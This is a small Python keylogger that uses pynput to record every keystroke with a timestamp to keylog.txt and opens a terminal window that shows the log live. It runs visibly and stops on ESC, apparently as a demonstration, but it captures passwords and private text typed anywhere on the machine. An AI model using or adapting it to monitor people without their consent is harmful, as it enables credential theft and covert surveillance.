import pynput.keyboard as keyboard
import datetime
import subprocess
import sys
import os

log_file = "keylog.txt"

# Auto-open a second terminal window showing live keystrokes
def open_live_viewer():
    if sys.platform == "win32":
        # Windows: opens a new PowerShell window following the log file
        subprocess.Popen(
            ['powershell', '-Command',
             f'Get-Content -Path "{os.path.abspath(log_file)}" -Wait'],
            creationflags=subprocess.CREATE_NEW_CONSOLE
        )
    elif sys.platform == "darwin":
        # Mac: opens a new Terminal window
        subprocess.Popen(
            ['osascript', '-e',
             f'tell app "Terminal" to do script "tail -f {os.path.abspath(log_file)}"']
        )
    else:
        # Linux: tries common terminal emulators
        for term in ['gnome-terminal', 'xterm', 'konsole']:
            try:
                subprocess.Popen([term, '--', 'tail', '-f', os.path.abspath(log_file)])
                break
            except FileNotFoundError:
                continue

def on_press(key):
    time_stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        entry = f"{time_stamp} - '{key.char}'"
    except AttributeError:
        entry = f"{time_stamp} - '[{key.name}]'"

    print(entry)                            # also prints in the main terminal
    with open(log_file, "a") as file:
        file.write(entry + "\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Create the log file immediately so the viewer has something to open
with open(log_file, "a") as f:
    f.write(f"\n--- Session started {datetime.datetime.now()} ---\n")

open_live_viewer()
print("Keylogger is running... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Stopped")
